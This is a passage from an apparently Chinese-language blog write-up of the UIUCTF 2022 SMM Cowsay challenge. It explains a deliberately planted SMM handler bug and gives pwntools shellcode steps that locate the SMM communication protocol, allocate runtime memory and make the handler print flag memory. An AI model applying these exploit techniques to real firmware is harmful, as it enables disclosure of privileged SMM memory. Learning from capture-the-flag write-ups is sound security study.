   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               UnloadImage;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT_BOOT_SERVICES         ExitBootServices; <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_GET_NEXT_MONOTONIC_COUNT   GetNextMonotonicCount; <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_STALL                      Stall;                 <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_WATCHDOG_TIMER         SetWatchdogTimer;      <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// DriverSupport Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CONNECT_CONTROLLER         ConnectController;     <span class="comment">// EFI 1.1</span></span><br><span class="line">    EFI_DISCONNECT_CONTROLLER      DisconnectController;  <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Open and Close Protocol Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_OPEN_PROTOCOL              OpenProtocol;           <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CLOSE_PROTOCOL             CloseProtocol;          <span class="comment">// EFI 1.1+</span></span><br><span class="line"> EFI_OPEN_PROTOCOL_INFORMATION     OpenProtocolInformation;<span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Library Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_PROTOCOLS_PER_HANDLE       ProtocolsPerHandle;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_HANDLE_BUFFER       LocateHandleBuffer;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_PROTOCOL            LocateProtocol;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES  InstallMultipleProtocolInterfaces;    <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces;   <span class="comment">// EFI 1.1+*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 32-bit CRC Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CALCULATE_CRC32    CalculateCrc32;     <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_COPY_MEM           CopyMem;        <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_SET_MEM            SetMem;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CREATE_EVENT_EX    CreateEventEx;  <span class="comment">// UEFI 2.0+</span></span><br><span class="line">  &#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>尝试一下执行shellcode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ pwn asm -c amd64 <span class="string">&#x27;mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]&#x27;</span></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Running...</span><br><span class="line">RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000</span><br><span class="line">...</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt; (0x6E7B667463756975).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;uiuctf&#123;n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; (0x2179727420656369).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;ice try!&#x27;</span></span><br></pre></td></tr></table></figure><p>QEMU 补丁按预期工作：MMIO 驱动程序发现我们没有从系统管理模式读取内存，并给了我们假标志。即使我们确实可以访问物理内存，我们仍然无法通过在 <code>Binexec.efi</code> 驱动程序中运行代码来读取该标志。我们需要从系统管理模式中读取它。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>题目给出了打在uefishell上的patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+Cowsay (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = AllocateRuntimeZeroPool(<span class="keyword">sizeof</span>(*Buffer) + <span class="keyword">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="keyword">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;Communicate(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br></pre></td></tr></table></figure><p>如上所述，普通 UEFI 驱动程序可以通过此“SmmCommunication”协议与注册了适当处理程序的 SMM UEFI 驱动程序进行通信，并且数据通过指向 <code>EFI_SMM_COMMUNICATE_HEADER</code> 结构的指针传递：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID HeaderGuid;</span><br><span class="line">  UINTN MessageLength;</span><br><span class="line">  UINT8 Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><p>注意到传递的消息实质上一个指针</p><p><code>*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</code></p><p>在这种情况下，发送的消息只是一个指针，它按原样复制到 <code>-&gt;Data</code> 数组成员中。换句话说， <code>Binexec.efi</code> 发送一个指向要通过 <code>mSmmCommunication-&gt;Communicate</code> 打印到 <code>SmmCowsay.efi</code> 的字符串的指针。如果我们看一下 <code>SmmCowsay.efi</code> 处理指针，我们可以看到它没有以任何特殊方式处理。它只是按原样传递给打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">    IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">    )</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="keyword">sizeof</span>(CHAR16 *))</span><br><span class="line">        <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">    Cowsay(*(CONST CHAR16 **)CommBuffer); <span class="comment">// &lt;== pointer passed *as is* here</span></span><br><span class="line"></span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着我们可以将任意指针传递给 <code>SmmCowsay</code> 驱动程序，它会很乐意为我们读取给定地址处的内存，并将其显示在控制台上，就像它是一个以 NUL 结尾的 <code>CHAR16</code> 的 <code>EFI_SMM_COMMUNICATE_HEADER</code> ，并通过 <code>mSmmCommunication-&gt;Communicate</code> 将其传递给 SMM 驱动程序，我们可以将其获取为我们打印旗帜！</p><p>但是我们如何获得这个“SmmCommunication”协议来调用它的 <code>-&gt;Communicate()</code> 方法呢？看一下 <code>Binexec.efi</code> 中的代码， <code>mSmmCommunication</code> 只是将正确的 GUID 传递给 <code>BootServices-&gt;LocateProtocol()</code> 获得的指针，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;LocateProtocol(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>那么我们现在需要做的就是想办法调用cowsay,并将flag的地址作为参数传送</p><p>我们需要得到 <code>SystemTable-&gt;BootServices-&gt;LocateProtocol</code> 。理论上，由于 EDK2 没有应用 ASLR，所有地址在我们的工作环境（本地和远程）中都是固定的，因此我们可以获取我们需要的任何函数的地址并直接调用</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="Step-1-get-LocateProtocol"><a href="#Step-1-get-LocateProtocol" class="headerlink" title="Step 1: get LocateProtocol"></a>Step 1: get LocateProtocol</h4><p><code>LocateProtocol</code> 函数在 <code>BootServices</code> 表 ( <code>gBS</code> ) 中提供，实际上我们在 <code>SystemTable</code> 中有一个指针。我们知道 <code>SystemTable</code> 的地址，因为程序将其打印到控制台了,但实际上因为edk2不支持任何aslr技术,所以哪怕不给,也能够调试获得</p><p>我们看LocateProtocol函数,其可以根据给定guid定位到protocol或者服务的地址,并将其存储在r8指向的空间(返回一个指向protocol的指针)</p><blockquote><p><strong>Summary</strong></p><p>Returns the first protocol instance that matches the given protocol.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_LOCATE_PROTOCOL) (</span><br><span class="line">  IN EFI_GUID                            *Protocol,</span><br><span class="line">  IN VOID                                *Registration OPTIONAL,</span><br><span class="line">  OUT VOID                               **Interface</span><br><span class="line"> );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Protocol</p><p>Provides the protocol to search for.</p></li><li><p>Registration</p><p>Optional registration key returned from <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html?highlight=locateprotocol#efi-boot-services-registerprotocolnotify">EFI_BOOT_SERVICES.RegisterProtocolNotify()</a> . If <em>Registration</em> is NULL, then it is ignored.</p></li><li><p>Interface</p><p>On return, a pointer to the first interface that matches <em>Protocol</em> and <em>Registration</em>.</p></li></ul><p><strong>Description</strong></p><p>The <strong>LocateProtocol</strong>() function finds the first device handle that support <em>Protocol</em>, and returns a pointer to the protocol interface from that handle in <em>Interface</em>. If no protocol instances are found, then <em>Interface</em> is set to NULL.</p><p>If <em>Interface</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Protocol</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p><p>If <em>Registration</em> is NULL, and there are no handles in the handle database that support <em>Protocol</em>, then EFI_NOT_FOUND is returned.</p><p>If <em>Registration</em> is not NULL, and there are no new handles for <em>Registration</em>, then EFI_NOT_FOUND is returned.</p><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>A protocol instance matching <em>Protocol</em> was found and returned in <em>Interface</em>.</th></tr></thead><tbody><tr><td>EFI_INVALID_PARAMETER</td><td><em>Interface</em> is NULL. <em>Protocol</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>No protocol instances were found that match Protocol and <em>Registration</em>.</td></tr></tbody></table></div></blockquote><p>我们首先通过几个简单的mov获得protocol的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;system_table&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]  /* SystemTable-&gt;BootServices */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 64]  /* BootServices-&gt;AllocatePool */</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 320] /* BootServices-&gt;LocateProtocol */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>) <span class="comment"># useful for later</span></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;AllocatePool   @ 0x%x&#x27;</span>, AllocatePool)</span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;LocateProtocol @ 0x%x&#x27;</span>, LocateProtocol)</span><br></pre></td></tr></table></figure><p>可以看到我们还获取了一个指针<code>BootServices-&gt;AllocatePool</code>,这个之后再说</p><h4 id="Step-2-get-mSmmCommunication"><a href="#Step-2-get-mSmmCommunication" class="headerlink" title="Step 2: get mSmmCommunication"></a>Step 2: get mSmmCommunication</h4><p>现在为了定位 <code>mSmmCommunication</code> 我们需要将一个指向协议 GUID 的指针传递给 <code>LocateProtocol</code> ，以及一个指向应存储结果指针的位置的指针。我们已经有一个可用的 RWX 内存区域（编写 shellcode 的区域），所以我们使用它。</p><p>此外,EDK2 的补丁 <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> 将页表的所有条目设置为 RWX : )</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from EDK2 source code (or opening Binexec.efi in a disassembler)</span></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication              @ 0x%x&#x27;</span>, mSmmCommunication)</span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication-&gt;Communicate @ 0x%x&#x27;</span>, Communicate)</span><br></pre></td></tr></table></figure><h4 id="Step-3-getflag"><a href="#Step-3-getflag" class="headerlink" title="Step 3: getflag"></a>Step 3: getflag</h4><p>现在，我们可以为 <code>SmmCowsay</code> 制作一条消息，其中包含指向标志的指针，并让它通过使用正确的参数调用 <code>mSmmCommunication-&gt;Communicate</code> 来为我们打印它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch</span></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check output to see if things work</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>看起来一切都完美了,但实际上这个脚本并不能成功跑通</p><p><code>RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2</code></p><p>返回值RAX是<code>800000000000000F</code>,通过UEFI的状态码表<a href="https://uefi.org/specs/UEFI/2.10/Apx_D_Status_Codes.html"> Status Codes — UEFI Specification 2.10 documentation</a>,我们可以得知这代表EFI_ACCESS_DENIED</p><p>尽管出题人明确添加了 EDK2 补丁以将 SMM 页表 ( <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> ) 中的所有内存标记为 RWX，但仍然对 SMM 通信执行健全性检查正如我们在 <a href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163">EDK2 源代码</a>中看到的那样，<strong>不允许communicate()函数的第二个参数缓冲区存在于不受信任或无效的内存区域（如我们的 shellcode 中使用的内存区域）</strong></p><p>不过当我们查看上面 <code>Binexec.efi</code> 的代码，在 <code>Cowsay()</code> 函数中， <code>EFI_SMM_COMMUNICATE_HEADER</code> 实际上是使用库函数 <code>AllocateRuntimeZeroPool()</code> 分配的。</p><p>这个函数同样存在于<code>BootServices</code>，但可以使用 <code>BootServices-&gt;AllocatePool()</code> 或 <code>BootServices-&gt;AllocatePages()</code> 指定我们要分配的内存“类型”来分配内存。我们想要的 <code>EFI_MEMORY_TYPE</code> 是类型 <code>EfiRuntimeServicesData</code> ，可以从 SMM 访问它。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后还有一个问题</p><p><code>IN CONST CHAR16 *Message</code></p><p>cowsay函数中调用的信息是UTF-16的,所以flag之会打印一半</p><p>不过将data中的0x44440000加上1即可,然后拼接一下</p><h2 id="uictf2022-cowsay2"><a href="#uictf2022-cowsay2" class="headerlink" 